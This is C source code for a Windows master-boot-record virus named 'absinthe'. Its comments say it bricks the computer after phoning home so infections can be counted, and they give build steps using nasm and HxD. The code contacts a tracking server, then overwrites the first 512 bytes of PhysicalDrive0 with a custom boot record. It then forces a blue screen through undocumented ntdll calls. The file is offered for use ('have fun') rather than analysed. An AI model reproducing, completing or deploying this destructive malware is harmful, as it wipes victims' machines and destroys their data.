/*

made by augboi incorporated
established 2002
based out of hoboken, NJ

shoot me an email! augustgl@protonmail.ch

*/

/*

welcome to absinthe

  _
 {_}
 |(|
 |=|
/   \
|.--|
||  |
||  |    .    ' .
|'--|  '     \~~~/
'-=-' \~~~/   \_/
       \_/     Y
        Y     _|_
       _|_


the MBR virus.

basically this is a virus that bricks a computer after reporting itself to a server so you can count infects.
have fun.

INSTRUCTIONS

	download HxD hex editor

	go into mbr.asm and scroll down to the bottom where you see this
		msg:            db

	edit the message to be whatever you want. just add 13,10 in between

	compile the mbr code with nasm. type
		nasm -f bin mbr.asm -o mbr.bin

	open mbr.bin in HxD and export it as C code.

	copy paste the exported byte array into 
		unsigned char mbrcode[512]

	compile and youre done

*/

#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h> // for windows functions
#include <winternl.h> // lmao
#include <WinInet.h>

#include <stdio.h> // printf

#pragma comment(lib, "wininet.lib")

// code for the MBR overwrite
// you should have gotten this from HxD

unsigned char mbrcode[512] = {
	
};

// phone home server

char *server =  (char *)"http://server/absinthe/fuck.php";


int http_get(char* szUrl, char* szRecvBuf, DWORD iRecvSize) {
	DWORD NumberOfBytesRead = 0;
	RtlZeroMemory(szRecvBuf, iRecvSize);
	HINTERNET connect = InternetOpenA("UFTUEDQSQYYNQUPDZWPRJLCCXDDNLLWZ", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (connect) {
		HINTERNET openAddr = InternetOpenUrlA(connect, szUrl, "NULL", 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);

		if (openAddr) {
			InternetReadFile(openAddr, szRecvBuf, iRecvSize, &NumberOfBytesRead);
			InternetCloseHandle(connect);
			InternetCloseHandle(openAddr);
			return NumberOfBytesRead;
		}
		InternetCloseHandle(connect);
		wchar_t buf[256];
		FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			buf, (sizeof(buf) / sizeof(wchar_t)), NULL);

		OutputDebugStringW(buf);
	}
	return -1;
}

// typedefs. we need these to call internal windows functions.
typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

BOOL bExplode(void) {
	DWORD dwBytesWritten; 

	HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", 
		GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		0, OPEN_EXISTING, 0, 0); // File handle on the physical drive
	
	if (WriteFile(hDevice, mbrcode, 512, &dwBytesWritten, 0)) { // write the code for the MBR to the first 512 bytes of the HDD
		printf("[*] MBR OVERWRITTEN SUCCESSFULLY");
	}

	CloseHandle(hDevice); // close handle

	return TRUE;
}

// stolen from stackexchange

int bsod() {
	BOOLEAN bEnabled;
	ULONG uResp;

	LPVOID lpAdjustPrive = GetProcAddress(LoadLibrary(TEXT("ntdll.dll")), "RtlAdjustPrivilege"); // function pointer for RtlAdjustPrivilege
	LPVOID lpRaiseError = GetProcAddress(LoadLibrary(TEXT("ntdll.dll")), "NtRaiseHardError"); // function pointer for NtRaiseHardError 

	pdef_RtlAdjustPrivilege calladj = (pdef_RtlAdjustPrivilege)lpAdjustPrive;
	pdef_NtRaiseHardError callraise = (pdef_NtRaiseHardError)lpRaiseError;

	NTSTATUS ntRet = calladj(19, TRUE, FALSE, &bEnabled); // call rtladjustprivilege
	callraise(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); // call ntraiseharderror, causing a BSoD

	return 0;
}

int main() {
	char buff[256];
	http_get(server, buff, sizeof(buff));
	
	bExplode();
	bsod();

	return 0;
	
}
